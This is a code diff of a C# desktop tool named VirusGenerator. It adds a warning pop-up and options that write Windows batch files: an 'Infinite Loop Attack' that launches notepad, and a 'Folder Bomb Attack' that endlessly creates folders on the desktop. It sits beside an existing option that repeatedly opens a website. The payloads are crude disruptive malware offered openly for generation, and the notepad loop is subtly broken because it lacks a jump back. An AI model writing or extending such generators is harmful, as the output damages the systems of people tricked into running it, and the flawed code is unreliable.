@@ -36,6 +36,7 @@ namespace VirusGenerator
         public Troy()
         {
             InitializeComponent();
+            MessageBox.Show("Warning: This program generates actual viruses that CAN and WILL damage your computer if you don't know what you are doing. Use at your own risk.", "WARNING!!!");
         }
 
         private void BtnGen_Click(object sender, EventArgs e)
@@ -49,9 +50,17 @@ namespace VirusGenerator
                 string[] nyanCatCmd = { "@echo off", ":loop", "start http://www.nyancat.com", "goto loop" };
                 System.IO.File.WriteAllLines(_outputFolder + file_name + fileExt, nyanCatCmd);
             }
-            if (CBoxAttack.Text == "Infinite Loop Attack")
+           if (CBoxAttack.Text == "Infinite Loop Attack")
+           {
+               string[] infiniteLoopCmd = { "@echo off",":loop", "start notepad.exe"};
+                System.IO.File.WriteAllLines(_outputFolder + file_name + fileExt, infiniteLoopCmd);
+           }
+
+           if (CBoxAttack.Text == "Folder Bomb Attack")
             {
-                string[] infiniteLoopCmd = { "@echo off", ":loop"}
+                
+                string[] folderBombAttackCmd = { "@echo off",  "cd desktop", ":loop", "mkdir virus", "goto loop" };
+                System.IO.File.WriteAllLines(_outputFolder + file_name + fileExt, folderBombAttackCmd);
             }
             else
             {
